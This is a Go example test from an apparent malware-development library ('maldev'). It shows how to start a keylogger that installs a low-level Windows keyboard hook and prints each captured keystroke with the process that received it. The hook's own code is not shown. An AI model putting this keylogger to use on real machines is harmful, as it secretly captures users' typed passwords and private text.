//go:build windows

package keylog_test

import (
	"context"
	"fmt"
	"time"

	"github.com/oioio-space/maldev/collection/keylog"
)

// Start installs the low-level keyboard hook and streams events.
// Cancelling the context tears down the hook and closes the channel.
func ExampleStart() {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	events, err := keylog.Start(ctx)
	if err != nil {
		fmt.Println("start:", err)
		return
	}
	for ev := range events {
		fmt.Printf("[%s] %q (vk=0x%x)\n", ev.Process, ev.Character, ev.KeyCode)
	}
}
